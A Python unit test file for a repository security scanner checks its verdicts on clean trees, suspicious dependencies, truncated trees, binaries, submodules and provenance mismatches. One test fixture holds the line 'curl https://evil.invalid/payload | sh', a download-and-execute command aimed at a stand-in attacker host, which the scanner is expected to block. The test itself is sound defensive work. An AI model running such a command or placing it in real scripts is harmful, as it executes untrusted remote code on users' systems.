from __future__ import annotations

import base64
import tempfile
import unittest
from pathlib import Path
from typing import Any

from researcher.github_api import GitHubResponse
from researcher.rate_limit import RateLimitManager
from researcher.security_admission import GitHubFullTreeSecurityScanner
from researcher.security_gate import SecurityVerdict
from researcher.state import SQLiteStateStore
from researcher.supply_chain import SupplyChainVerdict

from helpers import candidate


class FakeGitHubApi:
    def __init__(self, responses: dict[str, Any]) -> None:
        self.responses = responses
        self.calls: list[str] = []

    def get(self, path: str) -> GitHubResponse:
        self.calls.append(path)
        if path not in self.responses:
            raise AssertionError(f"Unexpected GitHub API path: {path}")
        return GitHubResponse(
            data=self.responses[path],
            headers={"X-RateLimit-Remaining": "4999", "X-RateLimit-Reset": "9999999999"},
        )


def _blob(content: str) -> dict[str, str]:
    encoded = base64.b64encode(content.encode("utf-8")).decode("ascii")
    return {"encoding": "base64", "content": encoded}


class FullTreeSecurityAdmissionTests(unittest.TestCase):
    def _scan(
        self,
        *,
        source_path: str = "package.json",
        source_content: str = '{"dependencies":{"safe-package":"^1.2.3"}}',
        source_mode: str = "100644",
        extra_entries: list[dict[str, Any]] | None = None,
        truncated: bool = False,
        expected_tree: str | None = None,
    ):
        item = candidate("secure-candidate", "a" * 40)
        tree_sha = "b" * 40
        if expected_tree is not None:
            item.extra["provenance_tree_sha"] = expected_tree
        blob_sha = "c" * 40
        entries: list[dict[str, Any]] = [
            {
                "path": source_path,
                "mode": source_mode,
                "type": "blob",
                "sha": blob_sha,
                "size": len(source_content.encode("utf-8")),
            }
        ]
        if extra_entries:
            entries.extend(extra_entries)
        responses: dict[str, Any] = {
            f"/repos/example/secure-candidate/commits/{'a' * 40}": {
                "sha": "a" * 40,
                "commit": {"tree": {"sha": tree_sha}},
            },
            f"/repos/example/secure-candidate/git/trees/{tree_sha}?recursive=1": {
                "tree": entries,
                "truncated": truncated,
            },
            f"/repos/example/secure-candidate/git/blobs/{blob_sha}": _blob(source_content),
        }
        with tempfile.TemporaryDirectory() as tmp:
            state = SQLiteStateStore(Path(tmp) / "state.db")
            api = FakeGitHubApi(responses)
            scanner = GitHubFullTreeSecurityScanner(api, RateLimitManager(state))  # type: ignore[arg-type]
            report = scanner.scan(item)
        return report, api.calls

    def test_clean_complete_tree_is_admission_eligible(self) -> None:
        report, calls = self._scan()
        self.assertEqual(report.verdict, SecurityVerdict.CLEAR)
        self.assertTrue(report.complete)
        self.assertTrue(report.admission_eligible)
        self.assertIsNotNone(report.supply_chain)
        assert report.supply_chain is not None
        self.assertEqual(report.supply_chain.verdict, SupplyChainVerdict.CLEAR)
        self.assertEqual(report.scanned_files, 1)
        self.assertFalse(report.executed_untrusted_code)
        self.assertEqual(len(calls), 3)

    def test_supply_chain_review_prevents_admission(self) -> None:
        report, _ = self._scan(
            source_content=(
                '{"dependencies":{"unsafe":"git+https://example.invalid/u.git#main"}}'
            )
        )
        self.assertEqual(report.verdict, SecurityVerdict.REVIEW)
        self.assertFalse(report.admission_eligible)
        self.assertIsNotNone(report.supply_chain)
        assert report.supply_chain is not None
        self.assertEqual(report.supply_chain.verdict, SupplyChainVerdict.REVIEW)

    def test_download_and_execute_script_is_blocked(self) -> None:
        report, _ = self._scan(
            source_path="install.sh",
            source_content="curl https://evil.invalid/payload | sh",
            source_mode="100755",
        )
        self.assertEqual(report.verdict, SecurityVerdict.BLOCK)
        self.assertFalse(report.admission_eligible)
        self.assertIn("shell_download_execute", {item.rule_id for item in report.findings})

    def test_truncated_tree_requires_review(self) -> None:
        report, _ = self._scan(truncated=True)
        self.assertEqual(report.verdict, SecurityVerdict.REVIEW)
        self.assertFalse(report.complete)
        self.assertIn("tree_truncated", {item.rule_id for item in report.findings})

    def test_precompiled_binary_requires_review_without_execution(self) -> None:
        binary_sha = "d" * 40
        report, calls = self._scan(
            extra_entries=[
                {
                    "path": "android/libs/vendor.so",
                    "mode": "100644",
                    "type": "blob",
                    "sha": binary_sha,
                    "size": 4096,
                }
            ]
        )
        self.assertEqual(report.verdict, SecurityVerdict.REVIEW)
        self.assertFalse(report.complete)
        self.assertIn("android/libs/vendor.so", report.opaque_artifacts)
        self.assertFalse(any(binary_sha in call for call in calls))

    def test_submodule_requires_review(self) -> None:
        report, _ = self._scan(
            extra_entries=[
                {
                    "path": "third_party/native",
                    "mode": "160000",
                    "type": "commit",
                    "sha": "e" * 40,
                }
            ]
        )
        self.assertEqual(report.verdict, SecurityVerdict.REVIEW)
        self.assertFalse(report.complete)
        self.assertIn("third_party/native", report.submodules)

    def test_tree_provenance_mismatch_blocks_candidate(self) -> None:
        report, _ = self._scan(expected_tree="f" * 40)
        self.assertEqual(report.verdict, SecurityVerdict.BLOCK)
        self.assertFalse(report.admission_eligible)
        self.assertIn(
            "tree_provenance_mismatch",
            {item.rule_id for item in report.findings},
        )


if __name__ == "__main__":
    unittest.main()
